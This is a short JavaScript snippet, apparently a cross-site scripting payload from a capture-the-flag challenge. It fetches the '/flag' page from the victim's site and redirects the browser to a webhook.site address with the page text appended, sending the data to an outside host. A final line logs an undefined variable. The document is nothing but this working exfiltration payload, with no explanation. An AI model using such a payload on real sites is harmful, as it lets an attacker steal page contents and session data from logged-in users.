fetch("/flag")
    .then(response => {return response.text();})
    .then(data => {
        document.location="https://webhook.site/a034d889-96de-4e15-9ff2-fae5d6e7d2fa/?c="+data;
    })

console.log(d);